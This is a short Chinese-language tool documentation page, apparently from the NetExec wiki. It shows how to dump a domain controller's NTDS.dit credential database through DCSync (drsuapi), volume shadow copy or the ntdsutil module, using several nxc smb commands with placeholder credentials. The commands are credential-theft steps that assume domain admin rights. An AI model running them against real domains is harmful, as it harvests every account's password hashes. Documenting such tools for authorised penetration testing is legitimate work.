# 导出 NTDS.dit

### 使用 secretsdump.py 中的方法从目标域控制器导出 NTDS.dit

{% hint style="danger" %}
需要目标域控制器上的域管理员或本地管理员权限
{% endhint %}

```
有 2 种可用方法：   
(默认) drsuapi - 使用 drsuapi RPC 接口创建句柄，触发复制，并结合其他 drsuapi 调用将结果链表转换为可读格式  
       vss - 使用卷影复制服务  
```

```
#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users
#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --users --enabled
#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
```

{% hint style="info" %}
你也可以使用域控制器的计算机账户进行 DCSYNC
{% endhint %}

还有一个 ntdsutil 模块，它将使用 ntdsutil 导出 NTDS.dit 和 SYSTEM hive，然后使用 secretsdump.py 在本地解析它们

```
#~ nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
```

记得每次获得 DA 权限时都要播放这首音乐

{% embed url="https://www.youtube.com/watch?v=SyjUwhBYa6Q" %}
